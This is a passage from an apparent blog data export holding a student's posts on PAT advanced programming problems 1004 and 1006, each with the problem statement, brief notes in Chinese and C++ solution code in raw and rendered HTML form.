class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> k1;</div><div class=\"line\"><span class=\"keyword\">int</span> k2;</div><div class=\"line\"><span class=\"keyword\">int</span> k3 = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">float</span> a[<span class=\"number\">1001</span>] = &#123;<span class=\"number\">0</span>&#125;;</div><div class=\"line\"><span class=\"keyword\">float</span> b[<span class=\"number\">1001</span>] = &#123;<span class=\"number\">0</span>&#125;;</div><div class=\"line\"><span class=\"keyword\">float</span> c[<span class=\"number\">1001</span>] = &#123;<span class=\"number\">0</span>&#125;;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; k1;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; k1; i++)&#123; <span class=\"keyword\">int</span> tmp; <span class=\"built_in\">cin</span> &gt;&gt; tmp; <span class=\"built_in\">cin</span> &gt;&gt; a[tmp]; &#125;</div><div class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; k2;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; k2; i++)&#123; <span class=\"keyword\">int</span> tmp; <span class=\"built_in\">cin</span> &gt;&gt; tmp; <span class=\"built_in\">cin</span> &gt;&gt; b[tmp]; &#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1000</span>; i &gt; <span class=\"number\">-1</span>; i--)</div><div class=\"line\">\t&#123; </div><div class=\"line\">\t\tc[i] = a[i] + b[i]; </div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (c[i])</div><div class=\"line\">\t\t\tk3++;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (k3) &#123; <span class=\"built_in\">cout</span> &lt;&lt; k3 &lt;&lt; <span class=\"string\">' '</span>; &#125;</div><div class=\"line\">\t<span class=\"keyword\">else</span> &#123; <span class=\"built_in\">cout</span> &lt;&lt; k3 &lt;&lt; <span class=\"built_in\">endl</span>; <span class=\"keyword\">return</span> <span class=\"number\">0</span>; &#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; !c[i]; i++)&#123; flag = i + <span class=\"number\">1</span>; &#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1000</span>; i &gt; <span class=\"number\">-1</span>; i--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (c[i] &amp;&amp; i != flag)</div><div class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d %.1f \"</span>, i, c[i]);</div><div class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (c[i] &amp;&amp; i == flag)</div><div class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d %.1f\\n\"</span>, i, c[i]);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n"},{"title":"PAT advanced 1004","date":"2017-02-08T08:02:14.000Z","_content":"\n## Description\n\n>  1004.Counting Leaves(30)\n\n> A family hierarchy is usually presented by a pedigree tree. Your job is to count those family members who have no child.\nInput\n\n> Each input file contains one test case. Each case starts with a line containing 0 < N < 100, the number of nodes in a tree, and M (< N), the number of non-leaf nodes. Then M lines follow, each in the format:\n\n> ID K ID[1] ID[2] ... ID[K]\nwhere ID is a two-digit number representing a given non-leaf node, K is the number of its children, followed by a sequence of two-digit ID's of its children. For the sake of simplicity, let us fix the root ID to be 01.\nOutput\n\n> For each test case, you are supposed to count those family members who have no child for every seniority level starting from the root. The numbers must be printed in a line, separated by a space, and there must be no extra space at the end of each line.\n\n> The sample case represents a tree with only 2 nodes, where 01 is the root and 02 is its only child. Hence on the root 01 level, there is 0 leaf node; and on the next level, there is 1 leaf node. Then we should output \"0 1\" in a line.\n\n> Sample Input\n2 1\n01 1 02\nSample Output\n0 1\n\n参考了排行榜里的一位前辈，学习了很多的东西，比如`vector`真的是一个很方便的东西；又比如`std::max(int a ,int b)`这个很方便的函数。很多在学数据结构的时候没有好好学习，数据结构还是要补一补。\n\n不过这种不系统的学习方法真的好么？\n\n还是要抽时间好好学一遍的。\n\n## Code\n\n```\n#include <cstdio>\n#include <queue>\n#include <vector>\n#include <cstring>\n#include <string>\n#include <iostream>\n#include <algorithm>\n#include <climits>\n\ntypedef long long LL;\nusing namespace std;\nconst int maxN = 1e2 + 10;\n\nint n;\nint m;\nint ans[maxN];\nint deep = 0;\n\nvector<int> tree[maxN];\n\nvoid dfs(int i, int d)\n{\n\tdeep = max(deep, d);\n\tif (!tree[i].size()) ans[d]++;\n\tfor (int j = 0; j < tree[i].size(); j++)\n\t{\n\t\tdfs(tree[i][j], d + 1);\n\t}\n}\n\nint main()\n{\n\tscanf(\"%d%d\", &n, &m);\n\twhile (m--)\n\t{\n\t\tint id, d;\n\t\tscanf(\"%d%d\", &id, &d);\n\t\twhile (d--)\n\t\t{\n\t\t\tint y;\n\t\t\tscanf(\"%d\", &y);\n\t\t\ttree[id].push_back(y);\n\t\t}\n\t}\n\tdfs(1, 0);\n\tfor (int i = 0; i <= deep; i++)\n\t\tprintf(\"%s%d\", i ? \" \" : \"\", ans[i]);\n\tsystem(\"pause\");\n\treturn 0;\n}\n```","source":"_posts/PAT-advanced-1004.md","raw":"---\ntitle: PAT advanced 1004\ntags:\n  - PAT\ncategories: []\ndate: 2017-02-08 16:02:14\n---\n\n## Description\n\n>  1004.Counting Leaves(30)\n\n> A family hierarchy is usually presented by a pedigree tree. Your job is to count those family members who have no child.\nInput\n\n> Each input file contains one test case. Each case starts with a line containing 0 < N < 100, the number of nodes in a tree, and M (< N), the number of non-leaf nodes. Then M lines follow, each in the format:\n\n> ID K ID[1] ID[2] ... ID[K]\nwhere ID is a two-digit number representing a given non-leaf node, K is the number of its children, followed by a sequence of two-digit ID's of its children. For the sake of simplicity, let us fix the root ID to be 01.\nOutput\n\n> For each test case, you are supposed to count those family members who have no child for every seniority level starting from the root. The numbers must be printed in a line, separated by a space, and there must be no extra space at the end of each line.\n\n> The sample case represents a tree with only 2 nodes, where 01 is the root and 02 is its only child. Hence on the root 01 level, there is 0 leaf node; and on the next level, there is 1 leaf node. Then we should output \"0 1\" in a line.\n\n> Sample Input\n2 1\n01 1 02\nSample Output\n0 1\n\n参考了排行榜里的一位前辈，学习了很多的东西，比如`vector`真的是一个很方便的东西；又比如`std::max(int a ,int b)`这个很方便的函数。很多在学数据结构的时候没有好好学习，数据结构还是要补一补。\n\n不过这种不系统的学习方法真的好么？\n\n还是要抽时间好好学一遍的。\n\n## Code\n\n```\n#include <cstdio>\n#include <queue>\n#include <vector>\n#include <cstring>\n#include <string>\n#include <iostream>\n#include <algorithm>\n#include <climits>\n\ntypedef long long LL;\nusing namespace std;\nconst int maxN = 1e2 + 10;\n\nint n;\nint m;\nint ans[maxN];\nint deep = 0;\n\nvector<int> tree[maxN];\n\nvoid dfs(int i, int d)\n{\n\tdeep = max(deep, d);\n\tif (!tree[i].size()) ans[d]++;\n\tfor (int j = 0; j < tree[i].size(); j++)\n\t{\n\t\tdfs(tree[i][j], d + 1);\n\t}\n}\n\nint main()\n{\n\tscanf(\"%d%d\", &n, &m);\n\twhile (m--)\n\t{\n\t\tint id, d;\n\t\tscanf(\"%d%d\", &id, &d);\n\t\twhile (d--)\n\t\t{\n\t\t\tint y;\n\t\t\tscanf(\"%d\", &y);\n\t\t\ttree[id].push_back(y);\n\t\t}\n\t}\n\tdfs(1, 0);\n\tfor (int i = 0; i <= deep; i++)\n\t\tprintf(\"%s%d\", i ? \" \" : \"\", ans[i]);\n\tsystem(\"pause\");\n\treturn 0;\n}\n```","slug":"PAT-advanced-1004","published":1,"updated":"2017-02-08T08:09:43.798Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jzl001thv182upvzbtf","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p> 1004.Counting Leaves(30)</p>\n<p>A family hierarchy is usually presented by a pedigree tree. Your job is to count those family members who have no child.<br>Input</p>\n<p>Each input file contains one test case. Each case starts with a line containing 0 &lt; N &lt; 100, the number of nodes in a tree, and M (&lt; N), the number of non-leaf nodes. Then M lines follow, each in the format:</p>\n<p>ID K ID[1] ID[2] … ID[K]<br>where ID is a two-digit number representing a given non-leaf node, K is the number of its children, followed by a sequence of two-digit ID’s of its children. For the sake of simplicity, let us fix the root ID to be 01.<br>Output</p>\n<p>For each test case, you are supposed to count those family members who have no child for every seniority level starting from the root. The numbers must be printed in a line, separated by a space, and there must be no extra space at the end of each line.</p>\n<p>The sample case represents a tree with only 2 nodes, where 01 is the root and 02 is its only child. Hence on the root 01 level, there is 0 leaf node; and on the next level, there is 1 leaf node. Then we should output “0 1” in a line.</p>\n<p>Sample Input<br>2 1<br>01 1 02<br>Sample Output<br>0 1</p>\n</blockquote>\n<p>参考了排行榜里的一位前辈，学习了很多的东西，比如<code>vector</code>真的是一个很方便的东西；又比如<code>std::max(int a ,int b)</code>这个很方便的函数。很多在学数据结构的时候没有好好学习，数据结构还是要补一补。</p>\n<p>不过这种不系统的学习方法真的好么？</p>\n<p>还是要抽时间好好学一遍的。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;climits&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">1e2</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n;</div><div class=\"line\"><span class=\"keyword\">int</span> m;</div><div class=\"line\"><span class=\"keyword\">int</span> ans[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> deep = <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; tree[maxN];</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">dfs</span><span class=\"params\">(<span class=\"keyword\">int</span> i, <span class=\"keyword\">int</span> d)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\tdeep = max(deep, d);</div><div class=\"line\">\t<span class=\"keyword\">if</span> (!tree[i].size()) ans[d]++;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; tree[i].size(); j++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tdfs(tree[i][j], d + <span class=\"number\">1</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;n, &amp;m);</div><div class=\"line\">\t<span class=\"keyword\">while</span> (m--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> id, d;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;id, &amp;d);</div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (d--)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">int</span> y;</div><div class=\"line\">\t\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;y);</div><div class=\"line\">\t\t\ttree[id].push_back(y);</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\tdfs(<span class=\"number\">1</span>, <span class=\"number\">0</span>);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt;= deep; i++)</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%s%d\"</span>, i ? <span class=\"string\">\" \"</span> : <span class=\"string\">\"\"</span>, ans[i]);</div><div class=\"line\">\tsystem(<span class=\"string\">\"pause\"</span>);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p> 1004.Counting Leaves(30)</p>\n<p>A family hierarchy is usually presented by a pedigree tree. Your job is to count those family members who have no child.<br>Input</p>\n<p>Each input file contains one test case. Each case starts with a line containing 0 &lt; N &lt; 100, the number of nodes in a tree, and M (&lt; N), the number of non-leaf nodes. Then M lines follow, each in the format:</p>\n<p>ID K ID[1] ID[2] … ID[K]<br>where ID is a two-digit number representing a given non-leaf node, K is the number of its children, followed by a sequence of two-digit ID’s of its children. For the sake of simplicity, let us fix the root ID to be 01.<br>Output</p>\n<p>For each test case, you are supposed to count those family members who have no child for every seniority level starting from the root. The numbers must be printed in a line, separated by a space, and there must be no extra space at the end of each line.</p>\n<p>The sample case represents a tree with only 2 nodes, where 01 is the root and 02 is its only child. Hence on the root 01 level, there is 0 leaf node; and on the next level, there is 1 leaf node. Then we should output “0 1” in a line.</p>\n<p>Sample Input<br>2 1<br>01 1 02<br>Sample Output<br>0 1</p>\n</blockquote>\n<p>参考了排行榜里的一位前辈，学习了很多的东西，比如<code>vector</code>真的是一个很方便的东西；又比如<code>std::max(int a ,int b)</code>这个很方便的函数。很多在学数据结构的时候没有好好学习，数据结构还是要补一补。</p>\n<p>不过这种不系统的学习方法真的好么？</p>\n<p>还是要抽时间好好学一遍的。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;climits&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">1e2</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n;</div><div class=\"line\"><span class=\"keyword\">int</span> m;</div><div class=\"line\"><span class=\"keyword\">int</span> ans[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> deep = <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; tree[maxN];</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">dfs</span><span class=\"params\">(<span class=\"keyword\">int</span> i, <span class=\"keyword\">int</span> d)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\tdeep = max(deep, d);</div><div class=\"line\">\t<span class=\"keyword\">if</span> (!tree[i].size()) ans[d]++;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; tree[i].size(); j++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tdfs(tree[i][j], d + <span class=\"number\">1</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;n, &amp;m);</div><div class=\"line\">\t<span class=\"keyword\">while</span> (m--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> id, d;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;id, &amp;d);</div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (d--)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">int</span> y;</div><div class=\"line\">\t\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;y);</div><div class=\"line\">\t\t\ttree[id].push_back(y);</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\tdfs(<span class=\"number\">1</span>, <span class=\"number\">0</span>);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt;= deep; i++)</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%s%d\"</span>, i ? <span class=\"string\">\" \"</span> : <span class=\"string\">\"\"</span>, ans[i]);</div><div class=\"line\">\tsystem(<span class=\"string\">\"pause\"</span>);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"PAT advanced 1006","date":"2017-02-08T16:10:16.000Z","_content":"\n## Description\n\n> 1006.Sign In and Sign Out (25)\n\n> Input Specification:\n\n> Each input file contains one test case. Each case contains the records for one day. The case starts with a positive integer M, which is the total number of records, followed by M lines, each in the format:\n\n> ID_number Sign_in_time Sign_out_time\nwhere times are given in the format HH:MM:SS, and ID number is a string with no more than 15 characters.\n\n> Output Specification:\n\n> For each test case, output in one line the ID numbers of the persons who have unlocked and locked the door on that day. The two ID numbers must be separated by one space.\n\n> Note: It is guaranteed that the records are consistent. That is, the sign in time must be earlier than the sign out time for each person, and there are no two persons sign in or out at the same moment.\n\n>Sample Input:\n3\nCS301111 15:30:28 17:00:10\nSC3021234 08:00:00 11:25:25\nCS301133 21:45:00 21:58:40\n\n>Sample Output:\nSC3021234 CS301133\n\n被自己蠢到了。开锁和上锁的输出顺序弄错了，瞎忙活了一个小时。\n\n`cin`遇到`Space`,`Tab`,`Enter`会结束读取。\n\n`||`优先级比`?`，长逻辑不确定记得加`()`\n\n## Code\n\n```\n#include <cstdio>\n#include <queue>\n#include <vector>\n#include <cstring>\n#include <string>\n#include <iostream>\n#include <algorithm>\n#include <climits>\n\nusing namespace std;\n\nint m;\nstring first;\nstring last;\nstring id;\n\nstruct id\n{\n\tint h, m, s;\n}maxi, mini, tmp;\n\nint main()\n{\n\tscanf(\"%d\", &m);\n\tfor (int i = 0; i < m;i++)\n\t{\n\t\tcin >> id;\n\t\tscanf(\"%d:%d:%d\", &tmp.h, &tmp.m, &tmp.s);\n\t\tif (!i || (tmp.h == mini.h ? tmp.m == mini.m ? tmp.s < mini.s : tmp.m < mini.m : tmp.h < mini.h))\n\t\t{\n\t\t\tmini = tmp; first = id;\n\t\t}\n\t\tscanf(\"%d:%d:%d\", &tmp.h, &tmp.m, &tmp.s);\n\t\tif (!i || (tmp.h == maxi.h ? tmp.m == maxi.m ? tmp.s > maxi.s : tmp.m > maxi.m : tmp.h > maxi.h))\n\t\t{\n\t\t\tmaxi = tmp; last = id;\n\t\t}\n\t}\n\tcout << first << \" \" << last << endl;\n\treturn 0;\n}\n```","source":"_posts/PAT-advanced-1006.md","raw":"---\ntitle: PAT advanced 1006\ntags:\n  - PAT\ncategories: []\ndate: 2017-02-09 00:10:16\n---\n\n## Description\n\n> 1006.Sign In and Sign Out (25)\n\n> Input Specification:\n\n> Each input file contains one test case. Each case contains the records for one day. The case starts with a positive integer M, which is the total number of records, followed by M lines, each in the format:\n\n> ID_number Sign_in_time Sign_out_time\nwhere times are given in the format HH:MM:SS, and ID number is a string with no more than 15 characters.\n\n> Output Specification:\n\n> For each test case, output in one line the ID numbers of the persons who have unlocked and locked the door on that day. The two ID numbers must be separated by one space.\n\n> Note: It is guaranteed that the records are consistent. That is, the sign in time must be earlier than the sign out time for each person, and there are no two persons sign in or out at the same moment.\n\n>Sample Input:\n3\nCS301111 15:30:28 17:00:10\nSC3021234 08:00:00 11:25:25\nCS301133 21:45:00 21:58:40\n\n>Sample Output:\nSC3021234 CS301133\n\n被自己蠢到了。开锁和上锁的输出顺序弄错了，瞎忙活了一个小时。\n\n`cin`遇到`Space`,`Tab`,`Enter`会结束读取。\n\n`||`优先级比`?`，长逻辑不确定记得加`()`\n\n## Code\n\n```\n#include <cstdio>\n#include <queue>\n#include <vector>\n#include <cstring>\n#include <string>\n#include <iostream>\n#include <algorithm>\n#include <climits>\n\nusing namespace std;\n\nint m;\nstring first;\nstring last;\nstring id;\n\nstruct id\n{\n\tint h, m, s;\n}maxi, mini, tmp;\n\nint main()\n{\n\tscanf(\"%d\", &m);\n\tfor (int i = 0; i < m;i++)\n\t{\n\t\tcin >> id;\n\t\tscanf(\"%d:%d:%d\", &tmp.h, &tmp.m, &tmp.s);\n\t\tif (!i || (tmp.h == mini.h ? tmp.m == mini.m ? tmp.s < mini.s : tmp.m < mini.m : tmp.h < mini.h))\n\t\t{\n\t\t\tmini = tmp; first = id;\n\t\t}\n\t\tscanf(\"%d:%d:%d\", &tmp.h, &tmp.m, &tmp.s);\n\t\tif (!i || (tmp.h == maxi.h ? tmp.m == maxi.m ? tmp.s > maxi.s : tmp.m > maxi.m : tmp.h > maxi.h))\n\t\t{\n\t\t\tmaxi = tmp; last = id;\n\t\t}\n\t}\n\tcout << first << \" \" << last << endl;\n\treturn 0;\n}\n```","slug":"PAT-advanced-1006","published":1,"updated":"2017-02-09T05:15:46.724Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jzp001vhv182t4iixsu","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1006.Sign In and Sign Out (25)</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. Each case contains the records for one day. The case starts with a positive integer M, which is the total number of records, followed by M lines, each in the format:</p>\n<p>ID_number Sign_in_time Sign_out_time<br>where times are given in the format HH:MM:SS, and ID number is a string with no more than 15 characters.</p>\n<p>Output Specification:</p>\n<p>For each test case, output in one line the ID numbers of the persons who have unlocked and locked the door on that day. The two ID numbers must be separated by one space.</p>\n<p>Note: It is guaranteed that the records are consistent. That is, the sign in time must be earlier than the sign out time for each person, and there are no two persons sign in or out at the same moment.</p>\n<p>Sample Input:<br>3<br>CS301111 15:30:28 17:00:10<br>SC3021234 08:00:00 11:25:25<br>CS301133 21:45:00 21:58:40</p>\n<p>Sample Output:<br>SC3021234 CS301133</p>\n</blockquote>\n<p>被自己蠢到了。开锁和上锁的输出顺序弄错了，瞎忙活了一个小时。</p>\n<p><code>cin</code>遇到<code>Space</code>,<code>Tab</code>,<code>Enter</code>会结束读取。</p>\n<p><code>||</code>优先级比<code>?</code>，长逻辑不确定记得加<code>()</code></p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight 